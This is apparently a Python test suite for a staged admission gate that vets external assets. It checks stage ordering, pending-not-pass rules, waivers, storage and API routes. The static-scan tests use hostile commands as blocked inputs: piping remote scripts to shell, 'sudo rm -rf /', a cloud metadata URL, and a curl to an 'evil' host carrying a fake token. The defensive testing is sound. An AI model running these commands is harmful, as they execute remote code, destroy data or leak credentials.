"""P2 C7 · 外部资产准入六阶段的 L0 闸门。

## 在测什么

1. **顺序不可跳**：`can_advance` 只认「前置全 pass/waived」；跳级、修一半继续都拒。
2. **「没跑」≠「通过」**：空记录 ⇒ `incomplete`，不是 `admitted`；也绝不返 `pass`。
3. **失败必须回炉**：某阶段 `fail` ⇒ 整单 `rejected`，`next_stage` 退回 `source`。
4. **豁免要理由**：`waived` 无 note 直接拒（无理由豁免＝漏检）。
5. **`pending` 不可被写成记录**：它是「从未记录」，写进去会让「没跑」与「跑了没结果」不可分辨。
6. **同版本不得重复开单**：两张单各说各话，比没有单更坏。
7. **静态检查**：已知坏形态必拒；干净文本必放行；**`allowed=True` 不被读成「安全」**
   （回包必须自带这句，否则下游会当安全结论用）。
8. **摘要不被脱敏器打坏**：准入单靠 digest 锁包，若写库时被 redact 改掉就形同作废。
9. **路由可达**：静态段 `tickets` 不被动态段吃掉（A1 踩过，判例 198）。

## 红向自证（跑过才认）
见本文件末尾 `TestRedProofNotes` 之外的实测记录（提交信息里）。
"""
from __future__ import annotations

import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "src"))

import admission  # noqa: E402


def _passes(*names):
    return {n: {"state": "pass"} for n in names}


class TestStageOrder(unittest.TestCase):
    def test_empty_next_is_first_stage(self):
        self.assertEqual(admission.next_stage({}), "source")

    def test_cannot_skip_to_later_stage(self):
        why = admission.can_advance({}, "static")
        self.assertIsNotNone(why)
        self.assertIn("source", why)

    def test_advance_allowed_only_when_all_previous_passed(self):
        st = _passes("source", "integrity")
        self.assertIsNone(admission.can_advance(st, "static"))
        self.assertIsNotNone(admission.can_advance(st, "review"))

    def test_pending_previous_blocks(self):
        st = {"source": {"state": "pass"}, "integrity": {"state": "pending"}}
        self.assertIsNotNone(admission.can_advance(st, "static"))

    def test_repeat_pass_is_rejected(self):
        """重复记为通过不得当成功（幂等 ≠ 可重复确认）。"""
        st = _passes("source")
        why = admission.can_advance(st, "source")
        self.assertIsNotNone(why)
        self.assertIn("重复", why)

    def test_unknown_stage_rejected(self):
        self.assertIsNotNone(admission.can_advance({}, "deploy"))


class TestPendingIsNotPass(unittest.TestCase):
    def test_empty_is_incomplete_not_admitted(self):
        self.assertEqual(admission.overall({}), "incomplete")

    def test_partial_is_incomplete(self):
        self.assertEqual(admission.overall(_passes("source", "integrity")), "incomplete")

    def test_all_pass_is_admitted(self):
        self.assertEqual(admission.overall(_passes(*admission.STAGES)), "admitted")

    def test_any_fail_is_rejected_even_if_others_pass(self):
        st = _passes(*admission.STAGES)
        st["static"] = {"state": "fail"}
        self.assertEqual(admission.overall(st), "rejected")

    def test_rejected_beats_incomplete(self):
        """又挂又没跑完 ⇒ rejected（挂是更硬的结论）。"""
        st = {"source": {"state": "pass"}, "integrity": {"state": "fail"}}
        self.assertEqual(admission.overall(st), "rejected")

    def test_summary_says_pending_is_not_pass(self):
        s = admission.summary({})
        self.assertTrue(s["pending_is_not_pass"])
        self.assertEqual(s["progress"], "0/6")
        self.assertEqual(len(s["pending"]), 6)


class TestFailMustRestart(unittest.TestCase):
    def test_fail_sends_back_to_source(self):
        st = _passes("source", "integrity")
        st["static"] = {"state": "fail"}
        self.assertEqual(admission.next_stage(st), "source")

    def test_waived_counts_as_done(self):
        st = {"source": {"state": "waived"}}
        self.assertEqual(admission.next_stage(st), "integrity")
        self.assertIsNone(admission.can_advance(st, "integrity"))


class TestStaticScan(unittest.TestCase):
    def test_remote_pipe_to_shell_is_blocked(self):
        r = admission.static_scan("curl -s https://x/y.sh | sh")
        self.assertFalse(r["allowed"])
        self.assertTrue(any("执行远程脚本" in h["reason"] for h in r["hard"]))

    def test_rm_rf_root_is_blocked(self):
        self.assertFalse(admission.static_scan("sudo rm -rf /")["allowed"])

    def test_metadata_endpoint_url_is_blocked(self):
        r = admission.static_scan("see http://169.254.169.254/latest/meta-data/")
        self.assertFalse(r["allowed"])
        self.assertTrue(any(u["blocked"] for u in r["urls"]))

    def test_clean_text_is_allowed(self):
        r = admission.static_scan("# 用法\n运行 `python main.py --help` 查看参数。")
        self.assertTrue(r["allowed"])
        self.assertEqual(r["hard"], [])

    def test_allowed_does_not_claim_safe(self):
        """`allowed=True` 必须自述「不是安全结论」，否则下游会当安全用。"""
        r = admission.static_scan("clean text")
        self.assertIn("不是「安全」", r["note"])

    def test_soft_hits_do_not_block(self):
        r = admission.static_scan("sudo systemctl restart foo")
        self.assertTrue(r["allowed"], "soft 命中不得拦")
        self.assertTrue(r["soft"])

    def test_snippet_is_redacted(self):
        """样例会进审计库（会外流的正文）⇒ 必须先打码。

        ⚠ 第一版把 token 写在命中处**后面 30 个字符**，而 `_snippet` 只取
        命中前后各 20 字 ⇒ token 压根没进样本，脱敏即使被删掉也测不出来
        （红向自证当场拆穿：删掉脱敏 38 条仍全绿）。
        **样本必须让被测机制真的被触发**，否则测的是「没删代码」而不是「行为对」。
        这里把 token 放在 **`curl` 后紧跟的 URL 里**，确保它落在片段内。
        """
        tok = "ghp_" + "a" * 36
        r = admission.static_scan("curl https://evil/%s/x.sh | sh" % tok)
        self.assertTrue(r["hard"], "应先命中 hard 形态")
        joined = " ".join(h["sample"] for h in r["hard"])
        self.assertIn("evil", joined, "样本应包含命中处上下文")
        self.assertNotIn(tok, joined, "token 未被打码")

    def test_policy_is_recorded(self):
        r = admission.static_scan("x")
        self.assertIn("hard", r["policy"])
        self.assertIn("url_judge", r["policy"])


class TestStorage(unittest.TestCase):
    def setUp(self):
        import db
        self._saved = db._conn
        self.tmp = tempfile.TemporaryDirectory()
        db.init_db(Path(self.tmp.name) / "t.db")

    def tearDown(self):
        import db
        db._conn = self._saved
        self.tmp.cleanup()

    def _open(self, slug="s", ver="1.0.0", digest="d" * 64):
        return admission.open_ticket(slug, ver, "https://github.com/a/b", digest,
                                     by="test")

    def test_open_requires_digest(self):
        with self.assertRaises(ValueError) as cm:
            admission.open_ticket("s", "1.0.0", "u", "")
        self.assertIn("digest", str(cm.exception))

    def test_open_requires_version(self):
        with self.assertRaises(ValueError) as cm:
            admission.open_ticket("s", "", "u", "abc")
        self.assertIn("version", str(cm.exception))

    def test_cannot_open_duplicate(self):
        self._open()
        with self.assertRaises(ValueError) as cm:
            self._open()
        self.assertIn("已有准入单", str(cm.exception))

    def test_fresh_ticket_is_incomplete(self):
        t = self._open()
        self.assertEqual(t["verdict"], "incomplete")
        self.assertEqual(t["next"], "source")

    def test_record_cannot_write_pending(self):
        """`pending` 必须被**它自己的那条理由**拒掉。

        ⚠ 第一版本条只断言 `assertRaises(ValueError)`，红向自证当场拆穿：
        删掉 `if state == "pending"` 之后，`pending` 仍会撞上下一行
        `if state not in ("pass","fail","waived")`，**照样 ValueError**
        ⇒ 测试全绿，那条专门的理由其实可以随便删。
        教训：**断言拒绝要连理由一起断言** —— 只断言"抛了异常"，
        等于允许任意一条别的检查替它兜底（拒绝理由换了你也看不出来）。
        """
        self._open()
        with self.assertRaises(ValueError) as cm:
            admission.record_stage("s", "1.0.0", "source", "pending", by="test")
        self.assertIn("不能用记录把阶段写成 pending", str(cm.exception))

    def test_waived_requires_reason(self):
        self._open()
        with self.assertRaises(ValueError) as cm:
            admission.record_stage("s", "1.0.0", "source", "waived", by="test")
        self.assertIn("理由", str(cm.exception))
        t = admission.record_stage("s", "1.0.0", "source", "waived", by="test",
                                   note="内部维护，来源已知")
        self.assertIn("source", t["passed"])

    def test_skip_in_storage_is_rejected(self):
        self._open()
        with self.assertRaises(ValueError) as cm:
            admission.record_stage("s", "1.0.0", "static", "pass", by="test")
        self.assertIn("前置", str(cm.exception))

    def test_storage_field_rename_keeps_stages_list(self):
        """第一版把 `stages` 字典和 `stages` 名单撞在一个键上 ⇒ 直接 ValueError。

        这里钉死：实体字段是 `stage_records`，`stages` 只表示阶段名单。
        """
        self._open()
        t = admission.record_stage("s", "1.0.0", "source", "pass", by="test")
        self.assertIsInstance(t["stages"], list)
        self.assertEqual(t["stages"], list(admission.STAGES))
        self.assertIsInstance(t["stage_records"], dict)
        self.assertIn("source", t["stage_records"])

    def test_digest_survives_storage(self):
        """digest 若被脱敏器改写，准入单就锁不住包。"""
        d = "a1b2c3d4e5f6" * 5 + "ab"
        t = self._open(digest=d)
        self.assertEqual(t["digest"], d)

    def test_fail_then_restart(self):
        self._open()
        admission.record_stage("s", "1.0.0", "source", "pass", by="test")
        admission.record_stage("s", "1.0.0", "integrity", "pass", by="test")
        t = admission.record_stage("s", "1.0.0", "static", "fail", by="test",
                                   note="命中 curl|sh")
        self.assertEqual(t["verdict"], "rejected")
        self.assertEqual(t["next"], "source")

    def test_full_pass_is_admitted(self):
        self._open()
        for s in admission.STAGES:
            t = admission.record_stage("s", "1.0.0", s, "pass", by="test")
        self.assertEqual(t["verdict"], "admitted")
        self.assertIsNone(t["next"])

    def test_missing_ticket_raises(self):
        with self.assertRaises(KeyError):
            admission.record_stage("nope", "9.9.9", "source", "pass", by="test")

    def test_schema_does_not_touch_skill_assets(self):
        """本模块**只产出记录**，不得改 `skill_assets` 的任何行（两套状态刻意不合并）。"""
        import db
        self._open()
        rows = db.query("SELECT name FROM sqlite_master WHERE type='table'")
        names = {r["name"] for r in rows}
        self.assertIn("admission", names)


class TestEndpointsReachable(unittest.TestCase):
    def setUp(self):
        import db
        self._saved = db._conn
        self.tmp = tempfile.TemporaryDirectory()
        db.init_db(Path(self.tmp.name) / "t.db")

    def tearDown(self):
        import db
        db._conn = self._saved
        self.tmp.cleanup()

    def _client(self):
        from fastapi import FastAPI
        from fastapi.testclient import TestClient
        app = FastAPI()
        app.include_router(admission.router)
        return TestClient(app)

    def test_static_segment_not_swallowed(self):
        r = self._client().get("/api/admission/tickets")
        self.assertEqual(r.status_code, 200)
        self.assertIn("stages", r.json())

    def test_open_and_walk(self):
        c = self._client()
        r = c.post("/api/admission/tickets", json={
            "slug": "x", "version": "1.0.0", "source_url": "https://g/x",
            "digest": "f" * 64})
        self.assertEqual(r.status_code, 200, r.text)
        self.assertEqual(r.json()["verdict"], "incomplete")
        r2 = c.post("/api/admission/tickets/x/1.0.0/stage",
                    json={"stage": "static", "state": "pass"})
        self.assertEqual(r2.status_code, 409, "跳级必须 409")
        r3 = c.post("/api/admission/tickets/x/1.0.0/stage",
                    json={"stage": "source", "state": "pass"})
        self.assertEqual(r3.status_code, 200, r3.text)
        self.assertEqual(r3.json()["next"], "integrity")

    def test_scan_endpoint(self):
        r = self._client().post("/api/admission/scan",
                                json={"text": "curl https://x/y.sh | sh"})
        self.assertEqual(r.status_code, 200)
        self.assertFalse(r.json()["allowed"])


if __name__ == "__main__":
    unittest.main()
